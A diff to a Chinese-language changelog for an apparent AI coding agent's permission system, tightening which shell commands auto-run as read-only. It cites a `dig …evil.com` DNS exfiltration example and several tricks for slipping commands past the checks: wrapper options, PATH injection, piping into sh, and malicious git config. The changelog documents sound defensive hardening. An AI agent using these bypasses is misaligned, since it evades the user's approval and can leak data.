@@ -444,6 +444,39 @@ WebAssembly 载体整个移除。
 - `dig`、`ping` 移出只读白名单,走正常的权限判定(`default` 下询问)。它们按参数里的主机名
   发 DNS 查询,`dig <编码后的数据>.evil.com` 就能把数据带出去。要免询问的,写
   `Bash(dig:*)` / `Bash(ping:*)` 这类 allow 规则。
+- **只读 `Bash` 的判定改用 deny 规则那套调用解析**(`permissions::invocation`):行里启动的
+  每个程序都要按名字(不带路径)在只读名单里,读不出程序的(`$CMD x`、看不懂的 wrapper 选项)
+  不算只读。以前免询问、现在要询问(`plan` 下拒绝)的:wrapper 的选项吃掉了名字的
+  (`env -u ls sh -c …`、`exec -a ls python3 …`),带路径的程序(`./ls`、`bin/cat`、`./x=1 ls`),
+  经 `xargs` / `sudo` / `flock` 等 wrapper、`env -C` / `env -P`、`time -o` 跑的,`env` 传进危险
+  变量的(`env -u X PATH=. ls`、`env 'PATH=.' ls`),`printf -v`,关键字后面的赋值
+  (`if PATH=. ls`、`! PATH=. ls`),展开里的赋值(`${CDPATH:=/}`),以及 `>&word` / `N>&word`
+  (`word` 不是数字或 `-` 时是把 stdout 与 stderr 一起写进文件 `word`)。`2>&1`、`>&2`、`2>&-`
+  仍不算写。
+- 只读命令行上设了就要询问的变量扩大到一整类:任何 `GIT_*`(`GIT_CONFIG_COUNT` /
+  `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n`、`GIT_CONFIG_GLOBAL`、`GIT_CONFIG_PARAMETERS`、
+  `GIT_EXEC_PATH`…)、`XDG_*`(git 读 `$XDG_CONFIG_HOME/git/config`)、`*PAGER`、
+  `*_CONFIG_PATH` / `*_CONFIG_FILE`(`RIPGREP_CONFIG_PATH`…)、`MANOPT` / `MANROFFOPT`、
+  `KUBECONFIG`、`DOCKER_*`、`PYTHON*` / `PERL*` / `RUBY*` / `NODE_*`、`LD_*` / `DYLD_*`。
+- **`git` 只在会话自己所在的仓库里只读。** `cd` 进项目里的裸仓库(含 `HEAD`、`objects`、`refs`
+  的目录,如 `fixtures/x.git`)或嵌套的 `.git` 之后跑 `git status` / `git log` 等,要询问:那个
+  仓库的配置(`core.fsmonitor`、`diff.external`…)由项目作者写,git 会照着拉起程序。`cd -` /
+  `popd` 之后跑的 git 同样询问。`acceptEdits` 下也询问。
+- 只读命令的长选项按 GNU 与 git 的缩写规则匹配:`sort --outp=f`、`git grep --open-files-in=x`、
+  `git log --ext-dif`、`git branch --unset-up` 与全写一样处理。新认得的会拉起程序或写文件的
+  选项:`rg --hostname-bin`、`man -C` / `--config-file`、`info -o`、`file -C`、`nm --plugin`、
+  `ack --output` / `--pager`、`kubectl --kubeconfig` / `-s`。
+- 只读命令参数里的 glob 按它此刻在磁盘上匹配到的路径检查:`cat .*/x`(macOS 的 bash 3.2 让
+  `.*` 匹配 `..`)、`cat link*/x`(符号链接指到项目外)要询问,匹配超过 512 个路径的也询问。
+  `cd -` / `popd` 之后再 `cd` 一个相对路径,不再当作回到了已知的目录。
+- `nslookup`、`traceroute` 移出只读白名单(与 `dig`、`ping` 同理);`cargo metadata`、
+  `cargo tree`、`cargo --version` / `cargo version`、`rustc --version`、`rustup show` 移出只读
+  前缀:前两个要问 rustc,项目的 `.cargo/config.toml` 能把它换成任意程序
+  (`build.rustc-wrapper`,`cargo metadata` 还会写 `Cargo.lock`);后几个跑的是
+  `rust-toolchain.toml` 指定的工具链,它可以是一个路径。要免询问的,写 allow 规则。
+- **`acceptEdits` 不再放行发往未列出主机的 `WebFetch` / `Ping`。** 只有 `sandbox.allowed_domains`
+  列出的主机(含子域)免询问,其余与 `default` 一样询问——URL 本身就能把数据带出去。
+  其余只读调用照旧放行(含读项目外的文件)。
 - `Bash` 的 deny / ask 规则多了几种绕法的识别:`case`/`function`/`select` 块、读 stdin /
   here-string 的裸 `sh` / `bash`(`echo 'rm' | sh`、`bash <<< 'rm'`)程序名读不出来,有带内容的
   deny / ask 规则时按询问处理;`busybox` / `flock` / `ionice` / `chrt` / `taskset` / `pkexec` /
@@ -1015,6 +1048,11 @@ WebAssembly 载体整个移除。
 - `SessionManager::replace_messages_after_compact` 自己重排 `message_timestamps`(压缩留下的
   尾部保留原来的时间,前面新插入的记为现在),调用方不要再 `truncate` 它;`resume` 之后的
   `turn_count` 是用户发起的轮数(用户消息与斜杠命令展开),不再是日志行数。
+- `Tool` 多了 `accept_edits_allows(input, ctx)`(缺省即 `is_read_only(input)`),`acceptEdits`
+  的模式分派用它代替 `is_read_only`;自己包一层 `Tool` 的要转发它(`DeferredTool` 已转发)。
+  新增 `permissions::invocation::{traced_invocations, Traced}` 与
+  `base::interface::exec::domains_name_host`。`invocations` 把 `env` / `sudo` 后面任何带 `=`
+  的词都当作赋值(`env 'A=1' rm x`、`env ./x=1 rm x` 启动的是 `rm x`)。
 - `Tool` 多了 `leaves_plan_mode()`(缺省 `false`),`Permission` 多了 `check_for_delegate()`
   (按子 Agent 自己的 `SessionState` 判;缺省忽略它、照 `check` 判),都有缺省实现,已有实现
   不用改。自己包一层 `Permission` 的,转发 `check_for_delegate`,子 Agent 的模式和它读过的
